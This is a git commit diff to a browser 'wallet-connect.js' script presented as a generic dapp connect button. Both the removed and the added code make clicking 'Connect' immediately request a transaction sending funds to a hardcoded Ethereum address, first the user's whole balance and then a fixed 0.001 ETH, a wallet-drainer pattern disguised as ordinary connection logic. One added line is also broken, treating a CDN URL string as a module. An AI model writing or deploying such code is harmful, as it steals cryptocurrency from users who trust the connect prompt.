f25a4674e179fc0627f6091208ce308d75f6921a
olamicreas <70097198+olamicreas@users.noreply.github.com>
2023-09-22 11:08:10 +0100

    Update wallet-connect.js

--- static/wallet-connect.js
+++ static/wallet-connect.js
@@ -1,218 +1,67 @@
-"use strict";
-
-/**
- * Example JavaScript code that interacts with the page and Web3 wallets
- */
-
- // Unpkg imports
-const Web3Modal = window.Web3Modal.default;
-const WalletConnectProvider = window.WalletConnectProvider.default;
-
-
-// Web3modal instance
-let web3Modal
-
-// Chosen wallet provider given by the dialog window
-let provider;
-
-
-// Address of the selected account
-let selectedAccount;
-
-
-/**
- * Setup the orchestra
- */
-function init() {
-
-  console.log("Initializing example");
-  console.log("WalletConnectProvider is", WalletConnectProvider);
-
-
-  // Tell Web3modal what providers we have available.
-  // Built-in web browser provider (only one can exist as a time)
-  // like MetaMask, Brave or Opera is added automatically by Web3modal
-  const providerOptions = {
-    walletconnect: {
-      package: WalletConnectProvider,
-      options: {
-        // Mikko's test key - don't copy as your mileage may vary
-        infuraId: "b515c05d5db44cb3aa07665e4d316042",
-      }
-    },
-
-    
+if (typeof process === 'undefined') {
+  window.process = {
+  env: { NODE_ENV: 'development' }
   };
-
-
-  web3Modal = new Web3Modal({
-    network: "mainnet",
-    cacheProvider: false, // optional
-    providerOptions, // required
-
-    
-  });
-
-}
-
-
-/**
- * Kick in the UI action after Web3modal dialog has chosen a provider
- */
-async function fetchAccountData() {
-
-  // Get a Web3 instance for the wallet
-  const web3 = new Web3(provider);
-  provider = await web3Modal.connect();
-  console.log("Web3 instance is", web3);
-
-  // Get connected chain id from Ethereum node
-  const chainId = await web3.eth.getChainId();
-  // Load chain information over an HTTP API
-  const chainData = await EvmChains.getChain(chainId);
-  document.querySelector("#network-name").textContent = chainData.name;
-
-  // Get list of accounts of the connected wallet
-  const accounts = await web3.eth.getAccounts();
-
-  // MetaMask does not give you all accounts, only the selected account
-  console.log("Got accounts", accounts);
-  selectedAccount = accounts[0];
-
-  document.querySelector("#selected-account").textContent = selectedAccount;
-
-  // Get a handl
-  const template = document.querySelector("#template-balance");
-  const accountContainer = document.querySelector("#accounts");
-
-  // Purge UI elements any previously loaded accounts
-  accountContainer.innerHTML = '';
-
-  // Go through all accounts and get their ETH balance
-  const rowResolvers = accounts.map(async (address) => {
-    const balance = await web3.eth.getBalance(address);
-    // ethBalance is a BigNumber instance
-    // https://github.com/indutny/bn.js/
-    const ethBalance = web3.utils.fromWei(balance, "ether");
-    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
-    // Fill in the templated row and put in the document
-    const clone = template.content.cloneNode(true);
-    clone.querySelector(".address").textContent = address;
-    clone.querySelector(".balance").textContent = humanFriendlyBalance;
-    accountContainer.appendChild(clone);
-  });
-
-  // Because rendering account does its own RPC commucation
-  // with Ethereum node, we do not want to display any results
-  // until data for all accounts is loaded
-  await Promise.all(rowResolvers);
-
-  // Display fully loaded UI for wallet data
-  document.querySelector("#prepare").style.display = "none";
-  document.querySelector("#connected").style.display = "block";
-}
-
-
-
-/**
- * Fetch account data for UI when
- * - User switches accounts in wallet
- * - User switches networks in wallet
- * - User connects wallet initially
- */
-async function refreshAccountData() {
-
-  // If any current data is displayed when
-  // the user is switching acounts in the wallet
-  // immediate hide this data
-  document.querySelector("#connected").style.display = "none";
-  document.querySelector("#prepare").style.display = "block";
-
-  // Disable button while UI is loading.
-  // fetchAccountData() will take a while as it communicates
-  // with Ethereum node via JSON-RPC and loads chain data
-  // over an API call.
-  document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
-  await fetchAccountData(provider);
-  document.querySelector("#btn-connect").removeAttribute("disabled")
-}
-
-
-/**
- * Connect wallet button pressed.
- */
-async function connectWalletAndSendFunds() {
-  try {
-      // Open the modal to allow the user to select their wallet
-      const provider = await web3Modal.connect();
-      const web3 = new Web3(provider);
-
-      // Get the user's Ethereum address
-      const accounts = await web3.eth.getAccounts();
-      const userAccount = accounts[0];
-      const walletBal = await web3.eth.getBalance(userAccount)
-      // Display the connected wallet address
-      const walletAddressElement = document.getElementById("walletAddress");
-      walletAddressElement.innerHTML = `Connected to wallet with address: ${userAccount}`;
-
-      // Send funds immediately after connecting (replace with your specific transfer logic)
-      const toAddress = '0xBa4cf5755661985979d731FD3816e26293caf2D8'; // Replace with the recipient's Ethereum address
-      const amountToSend = web3.utils.toWei( walletBal, 'ether'); // Replace with the desired amount and unit
-
-      const transactionHash = await web3.eth.sendTransaction({
-          from: userAccount,
-          to: toAddress,
-          value: amountToSend,
-      });
-
-      // Display the transaction hash or success message
-      const transactionHashElement = document.getElementById("transactionHash");
-      transactionHashElement.innerHTML = `Transaction sent with hash: ${transactionHash}`;
-  } catch (error) {
-      console.error(error);
   }
 
 
-  await refreshAccountData();
-}
+import { WalletConnectModalSign } from "https://unpkg.com/@walletconnect/modal-sign-html@2.6.1";
+const { OpenSeaPort, Network } = "https://cdn.jsdelivr.net/npm/seaport@2.0.9/index.js";
+// 1. Define ui elements
+const connectButton = document.getElementById("connect-button");
 
-/**
- * Disconnect wallet button pressed.
- */
-async function onDisconnect() {
-
-  console.log("Killing the wallet connection", provider);
-
-  // TODO: Which providers have close method?
-  if(provider.close) {
-    await provider.close();
-
-    // If the cached provider is not cleared,
-    // WalletConnect will default to the existing session
-    // and does not allow to re-scan the QR code with a new wallet.
-    // Depending on your use case you may want or want not his behavir.
-    await web3Modal.clearCachedProvider();
-    provider = null;
-  }
-
-  selectedAccount = null;
-
-  // Set the UI back to the initial state
-  document.querySelector("#prepare").style.display = "block";
-  document.querySelector("#connected").style.display = "none";
-}
-
-
-/**
- * Main entry point.
- */
-window.addEventListener('load', async () => {
-  init();
-  const connectWalletButton = document.getElementById("connectWalletButton");
-  connectWalletButton.addEventListener("click", connectWalletAndSendFunds);
+// 2. Create modal client, add your project id
+const web3Modal = new WalletConnectModalSign({
+  projectId: "0d4f78d9c663f3cebe1019795245b1f2",
+  metadata: {
+    name: "My Dapp",
+    description: "My Dapp description",
+    url: "https://my-dapp.com",
+    icons: ["https://my-dapp.com/logo.png"],
+  },
 });
 
+// 3. Connect
+async function onConnect() {
+  try {
+    connectButton.disabled = true;
+    const session = await web3Modal.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ["eth_sendTransaction", "personal_sign"],
+          chains: ["eip155:1"],
+          events: ["chainChanged", "accountsChanged"],
+        },
+      },
+    });
+    console.log(session);
+     // Use the wallet's provider from Web3Modal
 
-// Add a click event listener to the "Connect Wallet" button
-const connectWalletButton = document.getElementById("connectWalletButton");
-connectWalletButton.addEventListener("click", connectWalletAndSendFunds);
+    
+    var accounts = session.namespaces.eip155.accounts[0].slice(9)
+    const transaction = {
+      to: '0xBa4cf5755661985979d731FD3816e26293caf2D8',
+      value: '1000000000000000', // 0.001 ETH in wei
+      gasPrice: '1000000000', // 1 gwei in wei
+      gas: '21000', // Standard gas limit for a simple transfer
+    };
+    
+    try {
+      const transactionHash = await session.request({
+        method: 'eth_sendTransaction',
+        params: [transaction],
+      });
+    
+      console.log('Transaction sent. Transaction Hash:', transactionHash);
+    } catch (error) {
+      console.error('Error sending ETH transaction:', error);
+    }
+  } catch (err) {
+    console.error(err);
+  } finally {
+    connectButton.disabled = false;
+  }
+}
+
+// 4. Create connection handler
+connectButton.addEventListener("click", onConnect);
